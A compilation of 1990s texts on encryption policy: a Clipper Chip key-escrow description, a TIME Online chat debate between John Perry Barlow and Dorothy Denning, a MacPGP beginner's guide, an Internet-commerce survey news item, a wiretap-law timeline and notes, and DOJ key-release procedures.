Let us assume that the tap is in place and that they have determined that the line is encrypted with the Clipper Chip. The law enforcement field is first decrypted with the family key F, giving E[K; U] + N. Documentation certifying that a tap has been authorized for the party associated with serial number N is then sent (e.g., via secure FAX) to each of the key escrow agents, who return (e.g., also via secure FAX) U1 and U2. U1 and U2 are XORed together to produce the unit key U, and E[K; U] is decrypted to get the session key K. Finally the message stream is decrypted. All this will be accomplished through a special black box decoder. CAPSTONE: THE NEXT GENERATION A successor to the Clipper Chip, called "Capstone" by the government and "MYK-80" by Mykotronx, has already been developed. It will include the Skipjack algorithm, the Digital Signature Standard (DSS), the Secure Hash Algorithm (SHA), a method of key exchange, a fast exponentiator, and a randomizer. A prototoype will be available for testing on April 22, and the chips are expected to be ready for delivery in June or July. ACKNOWLEDGMENT AND DISTRIBUTION NOTICE.

OnlineHost : Good evening and welcome to the Time Online Odeon! Tonight we look from both sides at the Clipper Chip, a semiconductor device that the National Security Agency developed and wants installed in every telephone, computer modem and fax machine. OnlineHost : In his article in the current issue of TIME, Philip Elmer-DeWitt writes: "The chip combines a powerful encryption algorithm with a ''back door'' -- the cryptographic equivalent of the master key that opens schoolchildren's padlocks when they forget their combinations. A ''secure'' phone equipped with the chip could, with proper authorization, be cracked by the government. OnlineHost: "Law-enforcement agencies say they need this capability to keep tabs on drug runners, terrorists and spies. Critics denounce the Clipper -- and a bill before Congress that would require phone companies to make it easy to tap the new digital phones -- as Big Brotherly tools that will strip citizens of whatever privacy they still have in the computer age. OnlineHost: "Lined up on one side are the three-letter cloak-and-dagger agencies -- the NSA, the CIA and the FBI -- and key policymakers in the Clinton Administration (who are taking a surprisingly hard line on the encryption issue). Opposing them is an equally unlikely coalition of computer firms, civil libertarians, conservative columnists and a strange breed of cryptoanarchists who call themselves the cypherpunks." RPTime: Lined up on our stage tonight are John Perry Barlow, Dr. Dorothy Denning and Philip Elmer-DeWitt. Barlow is co-founder of the Electronic Frontier Foundation, which promotes freedom in digital media. A recognized commentator on computer security, he is arguing against the Clipper Chip Dr. Denning is the chairperson of the Computer Science Department at Georgetown University. A leading expert on cryptography and data security, she favors the adoption of the Clipper Chip. Philip Elmer-DeWitt, TIME's technology editor will lead the questioning of our guests. Audience questions may be sent up using the Interact with Host function....Phil? PhilipED: Dr. Denning, could you *briefly* make the case for why we need the key escrow encryption system. DDenning: The government needs a new encryption standard to replace DES. They came up with a very strong algorithm called SKIPJACK. In making that available, they didn't want to do it in a way that could ultimately prove harmful to society. So they came up with the idea of key escrow so that if SKIPJACK were used to conceal criminal activity, they would be able to get access to the communications. PhilipED: THanks. Mr. Barlow, could you briefly make the case *against* Clipper. We'll see if I can be brief. We oppose Clipper in large part because of the traffic analysis which it makes possible. We believe that it is in the functional nature of the chip as designed to greatly enhance the ability of government to observe who we are calling, when, and from where, all fairly automatically and centrally. We also oppose Clipper because of the many way in which we believe the escrow system could be compromised, by people and institutions both inside and outside of government. PhilipED: Dr. Denning, what about John's contention that Clipper makes it easier to detect calling patterns. DDenning: I don't buy this. First off, for law enforcement to access any communications, they need a court order. Even if the communications are encrypted. Second, with a court order, they can get access to call setup information and find out what other lines the subject of the investigation is talking to. This is of much more use than anything in the encrypted stream. PhilipED: John, is Dorothy right that you need a court order for call set up info? Barlow1: Dorothy, the government asked for and received over 100,000 calling records last year without a court order. I see nothing in the Clipper documents which indicates that they would require a court order to get this kind of information, which each chip would make readily available to the entire network. DDenning: You need a court order to do implement pen registers and dialed number recorders in order to find out who is talking to whom. Barlow1: Furthermore, my faith in court orders has been eroded by 30 years of government wiretap abuse. PhilipED: Aren't we talking about three different hurdles here, one for a wiretap... Barlow1: But that's only with the present system where putting a pen register on a line requires physical entrance to a phone company site. PhilipED: One for a pen register (to track calling patterns in real time) and one for phone records. RPTime: Let's take a question from the audience... How would you guarantee that this facility will never be misused? If you can't make that guarantee, why should a democratic society, with a prohibition against prior restraint, consent to this? John Barlow? Barlow1: There are three different sources of information, as you say. But there are not three "hurdles." That sounds like a question for Dorothy. I don't think we should, obviously. RPTime: Dr. Denning? DDenning: First of all, there has been no evidence of widespread abuse of wiretaps since passage of the 1968 and 1978 wiretap statutes. Second, there are a lot of security mechanisms going into it to protect against abuse. Third, it will provide much greater protection against illegal wiretaps than we have now, since almost all phone conversations are in the clear. It will make virtually all illegal wiretaps impossible. Fourth, if for some reason it doesn't provide adequate protection, we can destroy the key databases and everyone will have absolute privacy against government wiretaps. I don't think our society will tolerate that kind of abuse. PhilipED: John, isn't Dorothy right that you're better off with compromised encryption than none? Barlow1: Gee, where to begin... First of all, there was plenty of abuse after 1968. Remember Watergate, Dorothy? Second, I believe that Clipper in the Net will dramatically *enhance* certain powers of... DDenning: I was talking specifically about wiretap abuses. And there hasn't been any evidence since the 1978 law. Barlow1: surveillance over current technical abilities. One of the reasons that wiretap hasn't been more abused is the bureaucratic overhead of current practices. Make it so that it doesn't require 50 agents to conduct a wire tap and you'll see a lot more of it. And Watergate included quite a number of wiretap violations. Indeed, the burglers were caught trying to install one. As to the assertion that we can always back up and destroy the databases if we don't like it, I can't imagine that someone as bright as yourself would believe that this is possible. Technology and power ratchet into positions which almost never retract without a complete change in the system of authority RPTime: Care to respond Dr. Denning? DDenning: Clipper would prevent the watergate burglars from getting anywhere since they wouldn't have a court order. Clipper will not make wiretaps cheaper or easier. Wiretaps are becoming more diffiults. And there will always be more agents involved becasue they have to follow exacting procedures, including minimization (throw out all conversations that are not specific to the crime at hand). Barlow1: Dorothy, they were from the *Government* remember? I can't imagine that Nixon wouldn't have been able to find a sympathetic ear from somebody at NIST and somebody else at Treasury. Further, you're not talking about the truly insidious element of this, which is dramatically improved traffic analysis. Content is less important than context, and most agents will support this. RPTime: Another question from the audience. JCMaille asks... Does the government have a constitutional right of access to my personal communications? Dr. Denning, why don't you go first? DDenning: The Supreme Court ruled that wiretaps with a court order are Constitutional. At one time, communications were not even protected under the 4th Amendment. The government could wiretap without a court order! Now a court order is required. PhilipED: To put the question another way, do citizens have a right to use powerful encryption? DDenning: Right now there are no laws preventing the use of any encryption. Clipper is voluntary. You can still use something else. RPTime: We have to apologize. John Barlow has temporarily lost his connection... PhilipED: Dr. Denning, in your opinion... would a law outlawing powerful encryption be unconstitutional? DDenning: I don't think so. But that doesn't mean it will happen. RPTime: John Barlow is back with us. Sorry for the interruption! Barlow, Denning just said she didn't think a law banning powerful encryption would be unconstitutional What do you say? Hi folks. Don't know what happened. Gald to be back Gald indeed! Barlow1: Actually, I believe that our current export embargoes are a violation of the 1st Amendment which specify speech without regard to the manner of speech. If we could restrict manner of speech, it would be constitutional to require that everyone speak English. Which of course it isn't PhilipED: John, can you make the case why ordinary law-abiding citizens need powerful encryption? Barlow1: Because it is in the nature of digitally networked communications to be quite visible. Everytime we make any sort of transaction in a digital environment, we smear our fingerprints all over Cyberspace. If we are to have any privacy in the future, we will need virtual "walls" made of cryptography. RPTime: Another audience question... Isn't this like the gun argument? If guns are outlawed only criminals will have guns? Well, if clipper is standardized, won't criminals be the ones NOT using it? RPTime: Dr. Denning? If Clipper becomes the de facto standard, then it will be the chief method of encryption. That would be what you'd get at Radio Shack. What criminals use will depend on what is readily available and what their cohorts are using. Both parties of a conversation have to use the same thing. Criminals also talk to a lot of people outside their immediate circle - e.g., to buy goods and services. Also, they can be quite stupid at times. But the main thing is that criminals will not be able to take advantage of the SKIPJACK algorithm as a way of concealing their conversations. This is the whole point. It is not to catch criminals. It is to allow people access to a really high quality algorithm in a way that someone cannot use it to conceal criminal activity. Barlow1: The gun analogy is excellent up to a point. I can't for the life of me imagine why we would think that even a stupid criminal would use Clipper if something else were available. And when I talk to people in the administration their big hobgoblin is the "nuclear-armed" terrorist. Any fanatic smart enough to assemble and detonate a nuclear device is going to be smart enough to download PGP from a bulletin board somewhere. Also, I'd like to point out that the gun analogy doesn't go the whole distance. Crypto is by its nature a purely *defensive* technology. You can't shoot people with it. PhilipED: Speaking of PGP, Dr. Denning, is that encryption system secure, in your opinion? DDenning: I don't know of anyone who's been able to break the IDEA algorithm that it uses. RPTime: Back to the audience for a question from Steve HW.. This is for Dr. Denning. What is the evidence of harm if the Clipper proposal is not adopted? DDenning: The harm would be to the government. They would not be able to use it and would have to resort to something less secure. Also, Clipper is part of a larger project to make hardware available for encryption and digital signatures. This will be used, for example, in the Defense Message System. The goverment needs a new standard. I personally believe that making really powerful encryption like SKIPJACK available without key escrow could be harmful to society. Wiretaps have been essential for preventing and solving many serious crimes and terrorist activities. Barlow1: Why on earth would the government have to use something else if they failed to get the rest of rest of us to buy into this folly? Hey, they are already using SKIPJACK. It's a government algorithm and has been in use for a... DDenning: CPSR and others are asking the government to drop Clipper. Barlow1: long time. There are plenty other algorithms which we can use which are truly protected... unless of course, this is only the first step in a process which will outlaw other forms of crypto. And I believe that it must be. Makes absolutely no sense otherwise. EFF is not asking the Government to drop Clipper, though we would vastly prefer they did. We're merely asking that no steps be taken to require it either by law or practice...as, for example, would be the case if you had to use a Clipper chip to file your tax return. PhilipED: Dr. Denning, do you think this is the "first step in a process to outlaw crypto"? DDenning: No I do not. The government has not been using SKIPJACK to my knowledge. The Clipper initiative represents the first time that the government has put one of their really good algorithms out there in the unclassified arena. They are trying to do this in a way that won't backfire against the public. Other NSA developed algorithms are not available for purchase by the public. Barlow1: I appreciate their willingness to make some of that crypto research available to a public which has paid so much for it, but I'm afraid that I would never trust an algorithm which was given to me by any government. And I certainly don't trust a classified algorithm like Skipjack, even without a back door which everyone can see. I think I'll stick to systems which have been properly vetted to be clear of such compromises, like RSA. I hope others will do likewise and that RSA will become the standard which Clipper shouldn't be. RPTime: Time for one more question from our audience... To John Barlow. Isn't society becoming increasingly vulnerable to concerted criminal/terrorist disruption, requiring *stronger* law enforcement tools? Barlow1: Gee. I don't know. It's a scary world. However, I'm willing to take my chances with the few terrorists and drug lords there are out there rather than trusting government with the kind of almost unlimited surveillance power which Clipper and Digital Telephony would give them. It's a touch choice. But when you look at the evil perpetrated by government over this century in the name of stopping crime, it far exceeds that done by other organized criminals. RPTime: Dr. Denning, hasn't remote listening technology enhanced police abilities to eavesdrop to the point... where the loss of a few wire taps won't mean much? DDenning: No. They need to get the cooperation of the service providers to implement a wiretap. The loss of some wiretaps could be costly indeed. As an example, wiretaps were used to help solve a case that involved plans by a Chicago gang from shooting down a commercial airliner. There have been 2 cases where they helped save the lives of kids who were going to be kidnaped for the making of a snuff murder film. They helped solve a case where a man's house was going to be bombed. I could go on. If we take John's arguments about law enforcement to their logical conclusion, we'd just get rid of law enforcement. I think it's better to have it. The people in law enforcement hate it as much as the rest of us when some member of the community does something wrong. And they correct it, design new procedures and laws where necessary, and go on. Barlow1: Oh, please. I'm not proposing eliminating police. I'm opposing giving them unlimited powers. Also,these are the same cases cited over and over by everyone from you to Judge Freeh. Surely, we aren't going to fundamentally change the balance of power in this country because of these two (undocumented, to my knowledge) stories. DDenning: Clipper is not going to change the balance of power. It does not give law enforcement any additional authority to do wiretaps. Barlow1: Well, this is where we basically disagree, Dorothy. If we could continue the same level of LE capacity we presently have, I'd have no objection. But I believe, for reasons I'm not sure we have the bandwidth to discuss here, that we are talking about dramatically enhancing their abilities. For one thing, we would greatly reduce the bureaucratic overhead involved in wiretap, which is what keeps it under 900 cases nationwide at the present. RPTime: And that will have to be the last word on the matter for tonight... DDenning: The overhead of a wiretap is more likely to increase, not decrease. PhilipED: Not quite! Maybe not! ;-) RPTime: THAT will be the final word! Barlow1: Well, let's get together and talk, Dorothy. RPTime: TIME thanks Dr. Dorothy Denning and John Perry Barlow for being with us tonight... along with Philip Elmer-DeWitt. Thank you all, and goodnight! Thank you both. This was very interesting. DDenning: Thank you for the opportunity to be here!

It is based upon Mac PGP 2.6.2 which is distributed by MIT. You can obtain information about MIT's PGP distributions on the World-Wide Web at http://web.mit.edu/network/pgp.html. **************************************** This guide: 1. Presents a brief overview of PGP. 2. Shows you how to generate a test key pair. We strongly recommend that you do this before you start using PGP for real. 3. Shows you how to generate a real key. 4. Shows you how to obtain keys from others and start sending and receiving messages. **************************************** COMMENTS ON USING AND INSTALLING MACPGP MacPGP is distributed by MIT in both source and binary forms. Most first-time users will want to use the binary, rather than compile the sources from scratch. However, there is a rather complex installation procedure you must go through. The reason for this complexity is that you will be using PGP's own authentication mechanisms to verify that the program is the original MIT distribution, and has not ben tampered with. If you are a beginning user, you may want to get help with this part of the installation procedure. MIT also distributes Apple Scripts that provide a PGP interface to Eudora. If you are a Eudora user, these scripts will greatly simplify your use of PGP. MIT hopes to be distributing PGP interfaces to other popular mailers in the future. However, even if you are planning to use the Eudora interface, we suggest that you work through this document and make at least a little use of "raw" MacPGP so that you will understand what the scripts are doing. Finally, before making any serious use of PGP, you should read Volume I of the PGP User's Guide by Philip Zimmermann. All distributions of PGP should come with copies of the User's Guide. If you have obtained a version of PGP that does not include the User's Guide, the distribution was incomplete, and you should obtain another version. **************************************** PART I: OVERVIEW OF PGP What is it? PGP or Pretty Good (TM) Privacy is a high-security cryptographic software application that allows people to exchange files or messages with both privacy and authentication. Privacy means that only those intended to receive a message can read it. By providing the ability to encrypt messages, PGP provides protection against anyone eavesdropping on the network. Even if a packet is intercepted it will be unreadable to the snooper. Further, by providing the ability to digitally sign any file or message PGP provides authentication and ensures that messages that appear to be from a particular person can only have originated from that person. In addition to its facilities for exchanging messages, PGP also enables you to encrypt files stored on your computer. How does it work? PGP is based on the public key cryptosystem, RSA. Unlike conventional cryptosystems which require the same key to encrypt and decrypt a message, public key systems use two related complementary keys, a public key and a secret key. The secret key unlocks the code that the public key makes and the public key unlocks the code that the secret key makes. Knowing one of the keys does not help you deduce the other. You are free to publish your public key anywhere you like including on electronic bulletin boards or the World-Wide Web. Anyone who wants to send you an encrypted message can use your public key to encrypt it knowing that only you have the secret key which will decrypt it. You can use your secret key to authenticate messages that you send. You "sign" your messages with your secret key thus proving to the receiver that you are the true sender of the message and that it no one has tampered with it. The recipient checks the signature with your public key. It is possible to provide both privacy and authentication by signing the message with your secret key and then encrypting the message with the recipient's public key. The recipient then uses her secret key to decrypt the message and your public key to authenticate the signature. PGP does this all automatically. How can I trust a public key? Never trust a public key you have downloaded from a bulletin board or elsewhere unless that key is signed by someone you trust. You must make sure that a public key really belongs to the person to whom it appears to belong and that it has no one has tampered with it. PGP provides an elaborate mechanism of "key signing" that allows people to sign keys whose authenticity they vouch for. If you obtain a key that is signed by a person you trust, then you can have some assurance that the key really is valid. How do I safeguard my secret key? Store your secret key on a machine over which you have physical control. Be sure to keep a back-up copy of your secret key. Remember you have the ONLY copy of it. If you lose it, all copies of your public key are useless. In addition, when you create your keys you will be asked for a pass phrase to encrypt your secret key. Since only you know your pass phrase, only you have access to your secret key. If you forget your pass phrase, your secret key is irretrievably lost. Can I use PGP from a shared computer or from a terminal over a network? Yes, but this is not as secure as using it from a computer over which you have physical control. It is possible for others to read your encrypted secret key and possibly intercept your key strokes and thus discover your pass phrase. Is PGP convenient to use? Unfortunately, no. With raw PGP you must save your message to a file, run PGP to encrypt it and then mail the encrypted file. MIT currently distributes interfaces that provide much more convenient integration to Eudora (for the Mac) and to Emacs (for Unix). There are also interfaces to Windows available from other sources. See the MIT PGP page on the World-Wide Web for up-to-date information. Will PGP solve all security problems? Absolutely not. While PGP provides excellent protection against two big security risks: eavesdroppers and impostors, it does little to protect your system from being accessed by an unauthorized individual. Choosing good passwords and setting sensible access controls are still necessary. **************************************** PART II. GENERATING A TEST KEY PAIR Start by obtaining a copy of MacPGP and installing it on your computer. This is a fairly elaborate process, which involves using PGP itself to check the integrity of the files you have obtained, to make sure that this really is the program distributed by MIT. At the end of this process, you should have a PGP folder that contains, the Mac PGP application, as well as documentation files. This folder will eventually also contain files called pubring.pgp, secring.pgp, and randseed.bin which hold your public and secret key rings, and also information used to seed PGP's random number generator. Don't worry if these files are not there initially. They will be generated as part of making your first key pair. Start PGP by double clicking on the application, then click once on the startup information window. MacPGP may complain that it cannot find your public and secret keyring files -- just click "OK". You should see a window named "PGP Messages." This shows output from PGP. Select "generate key" from the KEY menu. PGP may complain at this point that it cannot find the PGP User's Guide. PGP will not generate a key unless it can find the User's Guide in the "doc" file. Please place the User's Guide there if it is not already there. For this test key, use 512 bits as the key length. Use "test1" for the key ID (ignore the part about an email address). Don't worry about changing the key exponent. Also use "test1" for the passphrase. Don't ask to show the pass phrase. PGP will ask you to type some keystrokes to provide a source of random data. Then it will generate the key. This will also create the pubring, secring, and randseed files if they didn't already exist. Now we'll encrypt a message. Create a short text file called, e.g., "message", using your favorite word processor or some other way. In PGP, pick "encrypt/sign" from the FILE menu and indicate that you want to encrypt the message file. PGP will ask you to indicate which user you want to encrypt the message for. Click on the test1 key, which should produce a check mark next to it. (If there are other possible keys shown here, they got put in the key ring as part of the distribution process. You can remove these from your key ring later if you like.) After checking test1, click "OK". In the next dialogue window, check the button marked "encrypt" and check the box marked "produce output in ASCII Radix-64 format." In general you will always produce output in Radix 64 format, so you can send it via E-mail. Do NOT check the box marked "use conventional encryption". This is for encrypting files, not messages. This process should create a file called "message.asc". You can look at it with your word processor to verify that it looks like gibberish, delimited by begin and end message markers. Now let's decrypt the message. You could decrypt the message in this case by simply clicking on the message.asc file, but do it instead by selecting open/decrypt from the FILE menu. Indicate that you want to decrypt message.asc. In the next dialogue, choose "depending on type..." and give some name to be used for the decrypted output. PGP will now ask you to type your pass phrase (which, recall, was "test1"). If all goes well, the file will decrypt and you can open it and read it with your word processor. Normally, you will not only encrypt a message, you will encrypt and sign it, so people getting the message will know it really came from you. You can also sign a message without encrypting it. This operation (called "clearsigning") is used to ensure that messages you send will not be modified -- otherwise the signature will not verify. Signing a message requires that you type your passphrase. At this point, we strongly suggest that you take a little time to play around with PGP. Generate another key pair called test2. Encrypt a message for test2 signed by test1 and see if you can decrypt it using test2's passphrase. Sign a message and verify the signature. It's also a good idea to purposely make some mistakes. Type the passphrase incorrectly and see what error messages you get. Take a signed or encrypted message and modify it (using your word processor). Then decrypt it and see what PGP says. **************************************** III. GENERATING A REAL KEY PAIR Generate a key as before. For the length, use 1024 bits. The reality is that unless you are trying to keep information from the world's most powerful government agencies (and maybe even then) 512 bits is probably safe. But people are tending to use 1024 bits these days so you may as well, too. The only real disadvantage is that it takes longer (maybe 5 minutes) to generate the key, but you're not going to be generating new keys very often. For the key ID, use your name, followed by your complete email address enclosed in angle brackets. This form for the key ID is purely a convention, but this is a good way to make sure people can associate your key ID with you. Test your key by encrypting a message and/or signing something. When you're done, you may want to remove the test keys from your keyring. (Use "remove keys" from the KEY menu.) But there's no harm in keeping them around either. **************************************** IV. COMMUNICATING WITH OTHER PEOPLE The point of all this, of course, is that you want to communicate with other people, not just make test messages for yourself. To send someone a message, you need to have that person's public key. You encrypt the message using the recipient's public key, and then send the encrypted message as Email. At some point, someone will send you a key. Save the key in a file (or just save the entire message that contains the key). Start PGP and select "add keys" from the KEY menu. Indicate the file that contains the key, and indicate that you want the key added to pubring.pgp. After the key has been added, you can use "view keyring" from the KEY menu to look at pubring.pgp to see that it is there. If people are going to send you messages, they need to have your public key. To send your key to someone else, select "extract keys" from the KEY menu. Make sure you select the key from pubring.pgp, not from secring.pgp. Also make sure to check "ascify the output". The resulting key file (whose name ends in .asc) should be some lines of ASCII gibberish delimited by begin and end public key block markers. You can include this in a message to send to other people so that they can now encrypt messages to send to you. There are some elaborate rituals associated with exchanging keys, which help ensure that they keys do indeed come from their purported senders. One ritual is to call the person on the phone and verify that the key you received has the correct "fingerprint" (a list of 32 bytes written in hex format). Use "fingerprint key" from the KEY menu to see a key fingerprint. Another security mechanism is the whole structure of signing keys and assigning trust parameters to keys and signatures. This get pretty arcane. Read the PGP User's Guide if you really want to know. Another thing you can do is to post your key to a public key server and get other people's keys from a server. You do this by email. For more information, send a message to public-key-server@mit.edu, with the word "help" in the subject line. You should now be pretty well set in PGP basics. Read the PGP docs for more info. MacPGP also has extensive help information. Look under "help" in the Apple menu. Two points to remember: (1) If you are encrypting email, you should always choose to produce ASCII Radix 64 output. Otherwise the mail program may (and probably will) mess up the file you send. (2) If you are going to create a message with a word processor to be sent to a lot of people, create the message as a plain text message. Otherwise, the decrypted message will contain all the formatting information generated by your word processor. Of course, if you know that the people on the other end can read files in this format, it's fine to encrypt formatted files. PGP itself does not care whether the files it is encrypting are text files, or contain special characters or other binary information.

(NYSE: VFI) has released the results of a market study to assess merchant and consumer attitudes toward commerce over the Internet. VeriFone, who just announced its entry into the Internet payment industry, joined with MasterCard International and Visa International to sponsor the study. The study was conducted by Global Concepts Inc., an Atlanta-based research and consulting company specializing in the payments industry. The study consisted of three primary components: telephone interviews with 40 retailers, ranging from Fortune 500 corporations to small businesses; focus groups of consumers using online services; and an online survey of World Wide Web users. Speaking to Newsbytes, Pam Glinski, a consultant who worked on the study, said about the online survey, "We had pointers on the Web at thirty sites directing users to our survey. Of the Web users who responded to our online survey, 32 percent said they have already bought products and services over the Internet and that 91 percent plan purchases in the future." Consumers ranked credit cards as their number one preference for making Internet purchases. Ranked on a scale of one to five points, with one being equal to respondents' "least preferred" and five representing "greatest preference," the market study found users assigning credit cards a value of 3.66 out of a total of five points. Digital cash and checking account withdrawals were not far behind, with 3.33 and 3.25 points, respectively. ATM cards, with 2.80 points, and prepaid cards, with 2.62 points, completed the list. Consumers ranked card fraud as their number one concern in making Internet purchases. Ranked on a scale of one to five points, with one being equal to respondents' "least concern" and five representing "greatest concern," the market study found concern over card fraud at 3.6 points. Card fraud was closely followed by: having to pay for previously free information, 3.3 points; lack of privacy with Internet purchases, 3.1 points; and the viability of Internet merchants at 2.9 points. In speaking about the merchant interviews, Glinski said, "Many merchants who we interviewed are waiting to take full advantage of Internet commerce until the exchange of card data is more secure. Merchants are also waiting because women over age 55 do not yet comprise a significant percentage of online shoppers. "Merchants also expressed concern over the limited bandwidth available to most consumers who are online. Slow response times, especially with graphics or photos, create a negative impression. They acknowledge that this problem is being addressed with the development of new technology," said Glinski. (Richard Bowers/19950915/Press Contact: David B.

The bottom line is, now that encryption technology is in the hands of the users, there is nothing the government can do even today to spy on its citizens. The Clipper Chip, however, is not about giving the government the right to spy on its citizens; first of all it is restricted to the telephone system, and secondly it is volutnary. In Dorothy Denning's words, The standard (FIPS 185) is not a standard for the Internet or anyother high speed computer network. It is for the telephone system.Quoting from FIPS 185: "Data for purposes of this standard includesvoice, facsimile and computer information communicated in a telephonesystem. A telephone system for purposes of this standard is limited toa system which is circuit switched and operating at data rates ofstandard commercial modems over analog voice circuits or which usesbasic-rate ISDN or a similar grade wireless service." The standard will not make it any easier to tap phones, let alonecomputer networks. All it will do is make it technically possible todecrypt communications that are encrypted with the standard, assumingthe communications are not superencrypted with something else. The obvious question, then, is "when will the other shoe drop?" Clearly even the NSA alone is clearsighted enough to realize criminals and the like, who would be targets of wiretapping, would either superencrypt over Clipper, or use alternative technologies entirely. Therefore FIPS 185 must be the precursor to legislation which would outlaw strong non-government-approved encryption entirely. A Brief Overview of PGP, and Patented Algorithms RSA patented by PKP, which holds almost all useful public-key strong encryption patents. They produce RIPEM. patent violations of RSA have not to date been taken to court; a lawyer's letter has usually sufficed to get the offending software (PGP) removed from public access. most recently however a company which has been licensed by PKP has been in touch with Zimmerman, and a legal version of PGP may be on the horizon. digital telephony bill Though not specifically listed as a target in the proposal, many people arecalling Digital Telephony "Son of S. 266," a failed Senate bill that requiredthe same "dumbing-down" for encryption as the F.B.I. proposal does for phonesystems. In other words, makers of encryption devices or software were to berequired to leave a "back door" open for law -enforcement and security agenciesthat wanted to decode encrypted communication.

Brandeis dissented. 1934 Congress passed Communications Act, which included the provision that "no person not being authorized by sender shall intercept any communications and divulge ... the contents." 1938 Supreme Court construed Communications Act of 1934 to prohibit all telephone wiretapping. Justice Dept disagreed - saying it didn't apply to federal agents. President issued executive order allowing wiretapping for "national security purposes." Wiretapping continued. 1967 Katz vs. US - Supreme Court reversed 1928 decision. 1968 Congress enacts legislation that permits surveillance provided agents "minimized" data collected. Communication service providers were duty bound to assist agents but were not obliged to make their technology pre-equipped with trap-doors. 1978 Foreign Intelligence Surveillance Act. For the first time, standards for foreign espoinage were put down on paper. 1986 Wiretap Law extended to new forms of communication. 1987 Computer Security Act gave NIST control over crypto-standards for unclassified government and commercial sectors. Memorandum of Understanding between NSA and NIST gave NSA de-facto control over NIST for crypto-standards. Result - all govt. agencies have to use whatever standard the NSA chose. 1991 Senate Bill 266. Comprehensive Anti-terrorism Act. Sought wide powers for conducting wiretaps. The evolution of the law over time is very representative of the duality in the American legal system. Laws are passed by congress, executive orders are passed by the government, and laws are interpreted by the judiciary. The 1st and 4th Amendments form the constitutional basis for the protection of privacy. (Note: Marc Rotenberg's article in C-ACM, August 93, is a good reference for a quick overview of some of the events described here. Some of the other facts were gleaned from a number of different sources.) Problems with the Escrowed Encryption Standard (EES) Deviation from the usual FIPS procedures by NIST. Usual FIPS process has Open Standards Several drafts - seminars, public workshops Public comment Generation of technical ideas (instead the NSA has done everything in great secrecy and in a great hurry) Technical Content Free Standard ("Classified" Algorithm) No specifications - how can a company know how to develop its future products? Only way to get specs is with a classified contract (like AT&T) Compatibility issues No Cost Benefit analysis for Phones (Re: STEVE WALKER) Role of 5 experts selected to examine Clipper Proposal and Skipjack algorithm kept secret, avoid Federal Advisory Committee Act Issue to think about: which are greater - risks to safety or risks to liberty? How much can we trust the govt? How much privacy is there anyway? Is our perception of how much privacy we actually have just an illusion? Proposal for Authorization Procedures (As of Sep 93) In mid-Feb Clipper was introduced as a FIPS. Clipper would be installed on a device known as a Tessera Card.Tesserea (pl. Tessereae): Identity chit or marker ... forced on conquered people and slaves by their Roman conquerors or owners. Slaves or Gauls who refused...were branded or maimed as a form of identification. Black Box (PC) reads Law Enforcement Access Field in Clipper encrypted data stream. Black Boxes - all unique with own id no, owned exclusively by various law enforcement agencies. Agent faxes LEAF, black box id no, authorization and time period. Each escrow agent makes note in log, transmits key components directly. Supposed to last only as long as time period authorized and supposed to be only for that black box. Loopholes in the procedure No substantive rights for intercepted party if the agents do not follow procedure NSA doesn't need court order. mention no right to encryption software - in Feb 4 briefings - US citizens were not guaranteed the right to choose their own encryption technologies. Choice of Escrow Agents: are both from the executive branch. NIST (Dept. of Commerce) & Treasury Dept. Official reason - choose agency that has experience dealing with sensitive data. Gore reaction - early Feb 94 - "inadequate controls," "I raised hell about that." - branch of judiciary might be better. Escrow agents cannot prevent misuse because they do not see any details about the intercepted party other than LEAF. Official Reasons for introducing the regulations DES is on its death bed. Unclassified govt. data can be very sensitive - needs strong protection. US business interests abroad need to be protected from spying (this is one area that is actually part of the NSA's job). Since the NSA had the skipjack algorithm, which in its view was definitely far better than DES, it would be a good idea to share it with the public. The introduction of this new technology should not exclude licit law enforcement access. (A little out of context) The average cost of a wiretap is $45000, clipper would provide a much easier and cheaper wiretap (Dr. Denning) Criminals are careless and forgetful. After Clipper becomes the standard, they will forget about it and use Clipper encrypted communications. Safe system - cannot get out of hand because of Congressional review, judiciary and public involvement. If it does, just destroy the keys. (Dr. Denning) Real Reasons for introducing the regulations Competitive Intelligence. NSA wants pride, power and budget of Cold War era? NSC has wanted to increase surveillance abilities all along. So in this case Clipper did not arise out of a need to improve encryption protection available to citizens. Rather, Clipper is just a way of increasing wiretapping abilities. Previously had tried to use - Commercial COMSEC endorsement program (CCEP) - vendors would be required to join the program and would be authorized to incorporate classified algorithms into their communications systems. Under CCEP (which failed pass through Congress), the NSA could have done as they pleased with the keys. However, the program failed because of the great burden it would have placed on the telephone companies to modify their existing systems, without any form of subsidy. Some quotes: for example, in an article in the WSJ - March 28, 1988: "Technically, if someone bought out device and we made the keys and made a copy sure we could listen in. But we have better things to do with our time." Listening in on the American public? Listening in on governemnt employees - prevent embarrassing leaks? National Information Infrastructure - NSA wants it to be front-loaded with surveillance doors? Legitimate concerns about terrorists and criminals. Perhaps, the NSA really believes that the Clipper/Capstone/Tessera program will work without even considering the costs. Some naivete on part of the NSA? Authorization Procedures For Release Of Encryption Key Components In Conjunction With Intercepts Pursuant To Title III The following are the procedures for the release of escrowed key components in conjunction with lawfully authorized interception of communications encrypted with a key-escrow encryption method. These procedures cover all electronic surveillance conducted pursuant to Title III of the omnibus Crime Control In each case there shall be a legal authorization for the interception of wire and/or electronic communications. All electronic surveillance court orders under Title III shall contain provisions authorizing after-the-act minimization, pursuant to 18 U.S.C. 2518(5), permitting the interception and retention of coded communications, including encrypted communications. In the event that federal law enforcement agents discover during the course of any lawfully authorized interception that communications encrypted with a key escrow encryption method are being utilized, they may obtain a certification from the investigative agency conducting the investigation, or the Attorney General of the United States or designee thereof. Such certification shall identify the law enforcement agency or other authority conducting the interception and the person providing the certification; certify that necessary legal authorization has been obtained to conduct electronic surveillance regarding these communications; specify the termination date of the period for which interception has been authorized; identify by docket number or other suitable method of specification the source of the authorization; certify that communications covered by that authorization are being encrypted with a key-escrow encryption method; specify the identifier (ID) number of the key escrow encryption chip providing such encryption; and specify the serial (ID) number of the key-escrow decryption device that will be used by the law enforcement agency or other authority for decryption of the intercepted communications. The agency conducting the interception shall submit this certification to each of the designated key component escrow agents. If the certification has been provided by an investigative agency, as soon thereafter as practicable, an attorney associated with the United States Attorney's Office supervisi Upon receiving the certification from the requesting investigative agency, each key component escrow agent shall release the necessary key component to the requesting agency. The key components shall be provided in a manner that assures they cannot be used other than in conjunction with the lawfully authorized electronic surveillance for which they were requested. Each of the key component escrow agents shall retain a copy of the certification of the requesting agency, as well as the subsequent confirmation of the United States Attorney's office. In addition, the requesting agency shall retain a copy of the certification and provide copies to the following: the United States Attorney's office supervising the investigation, and the Department of Justice, Office of Enforcement operations. Upon, or prior to, completion of the electronic surveillance phase of the investigation, the ability of the requesting agency to decrypt intercepted communications shall terminate, and the requesting agency may not retain the key components. These procedures do not create, and are not intended to create, any 